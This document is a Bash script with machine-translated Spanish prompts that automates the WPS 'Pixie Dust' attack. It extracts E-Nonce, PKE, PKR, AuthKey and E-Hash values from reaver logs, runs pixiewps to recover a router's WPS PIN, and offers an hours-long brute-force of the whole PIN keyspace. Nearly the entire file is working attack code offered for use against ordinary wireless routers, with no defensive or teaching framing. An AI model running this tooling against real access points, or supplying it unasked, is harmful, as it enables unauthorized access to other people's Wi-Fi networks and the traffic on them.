#!/bin/bash
##############################################
txtrst="\e[0m"      # Text reset 
warn="\e[1;31m"     # warning		   red         
info="\e[1;34m"     # info                 blue           
q="\e[1;32m"	    # questions            green
inp="\e[1;36m"	    # input variables      magenta
yel="\e[1;33m"      # typed keyboard entries
##############################################
cleanup()

{

rm -f /tmp/timer01.sh
rm -f /tmp/configlist.txt
rm -f /tmp/Aquarius01
rm -f /tmp/Aquarius02
rm -f /tmp/Aquarius03
rm -f /tmp/Aquarius04
rm -f /tmp/nonseq.txt
rm -f /tmp/pixieseq.txt
killall -q timer01.sh
killall -q Eterm
killall -q pixiewps

return $?

}

control_c()
{

echo " Termina el programa"
sleep 5
cleanup
exit $?

}

trap control_c SIGINT


timer_fn()
{
#date1=`date +%s`
#while true; do echo -ne "  $(date -u --date @$((`date +%s` - $date1)) +%H:%M:%S)\r"; sleep 0.1; done

echo '#!/bin/bash' >/tmp/timer01.sh
echo 'date1=`date +%s`;' >>/tmp/timer01.sh
echo 'while true; do echo -ne "               $(date -u --date @$((`date +%s` - $date1)) +%H:%M:%S)\r"; sleep 0.1; done' >>/tmp/timer01.sh

chmod 755 /tmp/timer01.sh

Eterm -g 44x2-1+0 --cmod "red" --no-cursor  -w 1 -T "Pixiedust Elapsed Time" --exec "/tmp/timer01.sh" &

}

# matar a todos los procesos y archivos

rm -f /tmp/timer01.sh
rm -f /tmp/configlist.txt
rm -f /tmp/Aquarius01
rm -f /tmp/Aquarius02
rm -f /tmp/Aquarius03
rm -f /tmp/Aquarius04
rm -f /tmp/nonseq.txt
rm -f /tmp/pixieseq.txt
killall -9 timer01.sh &> /dev/null
killall -9 Eterm &> /dev/null
killall -9 pixiewps /dev/null

# Seleccione el archivo que se utilizará a partir de los registros de VARMAC

######hacer que el directorio para la salida reaver #############

PKRCOR="00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:02"

PKRERR="02:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"

PINNUM=0

if [[ ! -d "VARMAC_LOGS" ]]; then
    mkdir -p -m 700 VARMAC_LOGS;

	fi

echo -e "$info "
echo -e " PDDSA-06.sh"
echo -e "$yel                                Mosquete laboratorios Equipo"
echo -e "$yel                      Un polvo del duendecillo de datos de secuencia Analizador"
echo -e "$info                          Dedicado Para Liam Scheff"
echo -e "$info                          Autor de Historias Oficiales"
echo -e "$info                       Una claridad de tierras raras en pensamiento"
echo -e ""
echo -e "$info                 que es los esfuerzos conjuntos realizados pixiedust posible."
echo -e ""
echo -e "$warn     Este script requiere los datos de salida reaver que muestran tanto$yel PKE$warn y$yel PKR$warn."
echo -e "$info  Un atracador modded por$yel t6_x$info,$yel Datahead$info and$yel soxrok2212$info está disponible para su descarga."
echo -e "                           Reaver Versión obligada salida R: Nonce!"
echo -e "$warn     Este script requiere$yel pixiewps$warn por$yel wiire$warn ser instalado."
echo -e "$info     Al inicio del programa una carpeta llamada$yel root/VARMAC_LOGS$info fue hecho."      
echo -e "$inp      Copie todos los archivos de salida reaver en formato texto en esta carpeta y"
echo -e "$inp   continuar. Este script está diseñado para trabajar con VMR-MDK009x2.sh consulte los archivos de ayuda."
echo ""
echo -e "$info     ??Haciendo una pausa para permitir al usuario para completar los preparativos de archivos ....??$txtrst"

echo -e ""

	while true

	do

echo -e "$inp                              Press $yel(y/Y)$inp continuar...."
echo -e "         Press $yel(n/N)$inp abortar!!..Pulse cualquier otra tecla para volver a intentarlo:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|SI|si|si) break ;;
    n|N|no|NO|No)
      echo abortar - entraste $CONFIRM
      exit
      ;;

	  esac

		done

echo -e "$info  Entraste $CONFIRM.  continuando ...$txtrst"

SOURCENAMETEST=ZZZ

until [ $SOURCENAMETEST == y ] || [ $SOURCENAMETEST == Y ]; do  

echo -e "$txtrst "
ls /root/VARMAC_LOGS | tee /tmp/configlist.txt &> /dev/null
clear

# Hacer la lista de archivos en la carpeta de una variable

configfiles=$(cat /tmp/configlist.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e ""
echo -e "$info Reaver archivos que aparecen en el registro$yel VARMAC_LOGS$info carpeta.$txtrst"
echo " "
echo "$configfiles" | sed 's/^/       /'
echo ""
echo -e "$inp    Selecciona el$yel reaver Archivo de registro$inp para ser usado.$txtrst"
echo -e "$info  Después de seleccionar el archivo se verá en leafpad."
echo ""
echo -e "  Usted puede inspeccionar el leafpad delimitan y continuar...$txtrst"
echo ""
read  -p "   Ingrese número de línea Aquí: " grep_Line_Number

echo -e "$txtrst"

SOURCENAME=$(cat /tmp/configlist.txt | sed -n ""$grep_Line_Number"p")

echo ""

	while true
	do

leafpad /root/VARMAC_LOGS/$SOURCENAME &
echo ""
echo -e "$info Has elegido$yel $SOURCENAME$info que el archivo reaver."
echo -e "$inp Ingrese$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"

read SOURCENAMETEST

	case $SOURCENAMETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"
	rm /tmp/configlist.txt

	done

		done
echo ""
echo "    Leyendo $SOURCENAME - si el archivo es grande esto puede llevar tiempo,"
echo ""
echo "  Por favor espere.......!"


###################
#Pele reaver sólo pixiedust data

## Obtener BSSID


BSSID=$(cat < VARMAC_LOGS/$SOURCENAME | awk -F' ' '{ if(($2 == "Waiting") && ($4 = "beacon")) {print $6}}')

cat < VARMAC_LOGS/$SOURCENAME | awk -F' ' '{ if(($1 == "[P]") && ($2 != "WPS")) {print $2" "$3" "$4}}' > /tmp/Aquarius01

cat < /tmp/Aquarius01 | awk -F' ' '{ if($1 != "Access") {print $1" "$2" "$3" "$4}}' > /tmp/Aquarius02


#Añadir Número de línea para la secuencia pixie data corriente

cat -n  /tmp/Aquarius02 > /tmp/Aquarius03

#eliminar los espacios en blanco de izquierda de la primera palabra

cat < /tmp/Aquarius03 | sed -e 's/^[ \t]*//' > /tmp/Aquarius04

# Buscar Si configurar primero con la posible finalización

cat < /tmp/Aquarius04 | awk -F' ' '{ if(($2 == "E-Hash2:")) {print $1}}' > /tmp/nonseq.txt

# Número Búsqueda línea para obtener más data

# E-Hash2 líneas asignan las variables

#Contador Línea incrustar en awk

LNECNT=1

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

# Para terminar el programa, si no encontró Hash2

LINENULL=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)


if [ ! -z $LINENULL ]; then

# Encuentra el número total de secuencias en el archivo

until [ -z  $LINESTART ]; do   

	LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)
	LNECNT=$(($LNECNT + 1))

done

LNECNT=$(($LNECNT -2))

LNEND=$(($LNECNT))

LNEND=$(($LNEND))

#Restablecer volver a la línea de un

LNECNT=1


# EHash2 muestra la finalización de datos hacia abajo para recoger los cinco var 

BADAT=ZZZ

until [ $BADAT == 1 ]; do

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

SEQ_fn()

{

echo -e "$txtrst"

	if [ $LINESTART > 6  ]; then

SEQ7=$LINESTART

SEQ1=$(($SEQ7 -6 ))
SEQ2=$(($SEQ7 -5 ))
SEQ3=$(($SEQ7 -4 ))
SEQ4=$(($SEQ7 -3 ))
SEQ5=$(($SEQ7 -2 ))
SEQ6=$(($SEQ7 -1 ))
SEQ7=$(($SEQ7))

ENONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ1 -F' ' '{ if(($1 == startlne) && ($2 == "E-Nonce:")) {print $3}}')

PKE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ2 -F' ' '{ if(($1 == startlne) && ($2 == "PKE:")) {print $3}}')

RNONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ3 -F' ' '{ if(($1 == startlne) && ($2 == "R-Nonce:")) {print $3}}')

PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "PKR:")) {print $3}}')

AUTHKEY=$(cat < /tmp/Aquarius04 |awk -v startlne=$SEQ5 -F' ' '{ if(($1 == startlne) && ($2 == "AuthKey:")) {print $3}}')

HASH1=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ6 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash1:")) {print $3}}')

HASH2=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ7 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash2:")) {print $3}}')

if [ "$PKR" == "$PKRERR" ]; then

		PKR=$PKRCOR

    		    fi

echo "E-Nonce: = $ENONCE"

	if [ ! -z $BSSID ]; then

echo "E-BSSID: = $BSSID"

		fi

echo "E-Nonce: = $ENONCE"
echo "PKE: = $PKE"
echo "R-Nonce: = $RNONCE" 
echo "PKR: = $PKR"
echo "AuthKey: = $AUTHKEY"
echo "E-Hash1: = $HASH1"
echo "E-Hash2: = $HASH2"

	fi

}

echo ""
echo -e "$info Comprobación Pixie Dust data secuencia$yel $LNECNT$info."

SEQ_fn

if [ ${#ENONCE} = 47  ] && [ ${#PKE} = 575 ] && [ ${#RNONCE} = 47  ] && [ ${#PKR} = 575 ] && [ ${#AUTHKEY} = 95 ] && [ ${#HASH1} = 95 ] && [ ${#HASH2} = 95  ]; then

echo ""
echo -e "$info Comprobación Pixie Dust data secuencia$yel $LNECNT$info."
sleep 1

	if [ ! -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 Eterm &> /dev/null
        rm -f /tmp/timer01.sh

			fi

	if [ -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 Eterm &> /dev/null
        rm -f /tmp/timer01.sh

			fi


		BADAT=1
  		 
	else

		if [ $LNECNT -eq $LNEND ]; then

		BADAT=1
		echo -e "$info    Requerido Pixie data secuencias agotados.$txtrst"
		
			fi

		if [ $LNECNT -lt  $LNEND ]; then
					
		LNECNT=$(($LNECNT + 1))
		echo ""
		echo -e "$info    Requerido Pixie data incompleta tratando la siguiente secuencia.$txtrst"
		sleep 1
		BADAT=0

				fi

					fi

		done

pixieseq="/tmp/pixieseq.txt"

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

#####BRUTE FORCE 
BRUTETEST=ZZZ

if [[ $PINFND != WPS ]]; then

until [ $BRUTETEST == y ] || [ $BRUTETEST == Y ]; do


echo ""
echo -e "$q    Quiere fuerza bruta toda la keyspace (mode 4) de la secuencia de datos$yel $LNECNT$info.?"
echo ""
echo -e "$inp  Esto puede tomar un largo periodo de tiempo, a veces más de 12 horas."

echo -e "$inp  Ingrese$yel (y/Y)$inp a la fuerza bruta el pasador o$yel (n/N)$inp para saltar a la siguiente secuencia.$txtrst"
read BRUTE


	while true
	do

echo ""
echo -e "$info Has elegido$yel $BRUTE$info."
echo -e "$inp Ingrese$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo .$txtrst"

read BRUTETEST

	case $BRUTETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"


	done

		done

if [ $BRUTE = y ] || [ $BRUTE = Y ]; then

	if [ ! -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -f -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 Eterm &> /dev/null
        rm -f /tmp/timer01.sh

			fi

	if [ -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -f -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 Eterm &> /dev/null
        rm -f /tmp/timer01.sh


	fi

		fi
		
			fi


	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

###########A partir del bucle hacia adelante a través del archivo de salida reaver############

LNEFRW=ZZZ
LNEFRWTEST=ZZZ
LNELFT=$(($LNEND - $LNECNT))
LNELFT=$(($LNELFT))

if [[ $LNELFT > 0 && $PINFND != WPS ]]; then

clear

echo ""
echo -e "$q    Quiere comprobar más Pixie Dust E-Nonce, PKE, PKR, Clave de autenticación,"

echo -e "  E-Hash1,E-Hash2 secuencias incrustados en el $yel $SOURCENAME$q archivo?"
echo ""
echo -e "$info  Hay un total de$yel $LNELFT$info posible Pixie Dust secuencias restantes."
echo ""
echo -e "$inp  Ingrese$yel (y/Y)$inp para comprobar otras secuencias, entrar $yel (n/N)$inp abortar.
$txtrst"
echo -e  "  Pulse cualquier otra tecla para volver a intentarlo:$txtrst"

	while true

	do

#echo -e "$inp                              Press $yel(y/Y)$inp continuar...."
#echo -e "         Press $yel(n/N)$inp para abortar !! .. Pulse cualquier otra tecla para volver a intentarlo:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|SI|si|si) break ;;
    n|N|no|NO|No)
      echo Abortar - que ha introducido $CONFIRM
      exit
      ;;

	  esac

		done


until [ $LNELFT == 1 ] || [ $PINFND == WPS ]; do

	BADAT=1
	LNELFT=$(($LNEND - $LNECNT))
	LNECNT=$(($LNECNT + 1))
	LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

###Start of Loop

BADAT=ZZZ

	until [ $BADAT == 1 ]; do

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

echo ""
echo -e "$info Comprobación Pixie Dust data secuencia$yel $LNECNT$info."

SEQ_fn

if [ ${#ENONCE} = 47  ] && [ ${#PKE} = 575 ] && [ ${#PKR} = 575 ] && [ ${#AUTHKEY} = 95 ] && [ ${#HASH1} = 95 ] && [ ${#HASH2} = 95  ]; then

echo ""
echo -e "$info    Comprobación Pixie Dust data secuencia$yel $LNECNT$info."
echo -e "$info  Número total de posibles secuencias  = $yel$LNEND$info."
echo ""

	sleep 1

	if [ ! -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 Eterm &> /dev/null
        rm -f /tmp/timer01.sh

	##########Opción de fuerza bruta para la Secuencia

	# Establezca la var pin encontrado

	PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

	if [ -z $PINFND ]; then

BRUTEFORTEST=ZZZ

	until [ $BRUTEFORTEST == y ] || [ $BRUTEFORTEST == Y ]; do


	echo ""
	echo -e "$q    Quiere fuerza bruta toda la keyspace (mode 4) de la secuencia de datos$yel $LNECNT$info.?"
echo ""
echo -e "$inp  Esto puede tomar un largo periodo de tiempo, a veces más de 12 horas."

echo -e "$inp  Ingrese$yel (y/Y)$inp a la fuerza bruta el pasador o$yel (n/N)$inp para saltar a la siguiente secuencia.$txtrst"
read BRUTEFOR

	while true
	do

echo ""
echo -e "$info Has elegido$yel $BRUTEFOR$info."
echo -e "$inp Ingrese$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo .$txtrst"

	read BRUTEFORTEST

	case $BRUTEFORTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"


	done

		done


		if [ $BRUTEFOR == y ] || [ $BRUTEFOR == Y ]; then

			timer_fn
			sleep 1

			pixiewps -f -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

	fi

		fi

			fi

	if [ -z $BSSID ]; then

	timer_fn
	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR  --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

        killall -9 timer01.sh &> /dev/null
        killall -9 Eterm &> /dev/null
	rm -f /tmp/timer01.sh


	##########Opción de fuerza bruta para la Secuencia

	# Establezca la var pin encontrado

	PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')


		if [ -z $PINFND ]; then

BRUTEFORTEST=ZZZ

	until [ $BRUTEFORTEST == y ] || [ $BRUTEFORTEST == Y ]; do

	echo ""
	echo -e "$q    Quiere fuerza bruta toda la keyspace (modo 4) de la secuencia de datos$yel $LNECNT$info.?"
echo ""
echo -e "$inp  Esto puede tomar un largo periodo de tiempo, a veces más de 12 horas."

echo -e "$inp  Ingrese$yel (y/Y)$inp a la fuerza bruta el pasador o$yel (n/N)$inp para saltar a la siguiente secuencia.$txtrst"

read BRUTEFOR

	while true
	do

echo ""
echo -e "$info Has elegido$yel $BRUTEFOR$info."
echo -e "$inp Ingrese$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo .$txtrst"

	read BRUTEFORTEST

	case $BRUTEFORTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"


	done

		done

			if [ $BRUTEFOR == y ] || [ $BRUTEFOR == Y ]; then

			timer_fn
			sleep 1

			pixiewps -f -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

		        killall -9 timer01.sh &> /dev/null
		        killall -9 Eterm &> /dev/null
		        rm -f /tmp/timer01.sh

	fi

		fi

			fi


		BADAT=1  

	else

	BADAT=0
	LNECNT=$(($LNECNT + 1))
	echo ""
	echo -e "$info Requerido Pixie data incompleta tratando la siguiente secuencia.$txtrst"
	sleep 1

		if [ -z $LINESTART ]; then

			BADAT=1
			echo ""
			echo "  Pixiedust data secuencias agotados."


		fi

			fi

				done

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

	if [ $PINFND != WPS ]; then

		clear

			fi
      
		done

			fi



				fi 


if [ -z  $LINENULL ]; then

echo ""
echo -e "$txtrst    WPS Pin Extraviado."
echo -e "$txtrst  Pixie Dust Secuencias existencias - programa termina."
echo -e "$txtrst"

		fi

if [[ $LNELFT == 1 && $PINFND != WPS ]] || [[ $LNEND = 1 && $PINFND != WPS ]]; then

echo ""
echo -e "$txtrst    WPS Pin Extraviado."
echo -e "$txtrst  Pixie Dust Secuencias existencias - programa termina."
echo -e "$txtrst"

		fi

if [[ $PINFND == WPS ]]; then

WPSPIN=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $4}}')

echo ""
echo -e "$txtrst    WPS Pin Encontrado!"
echo ""
echo -e "$txtrst    WPS Pin = $WPSPIN"
echo ""
echo -e "$txtrst    Termina el programa...."
echo -e "$txtrst"

		fi



sleep 5

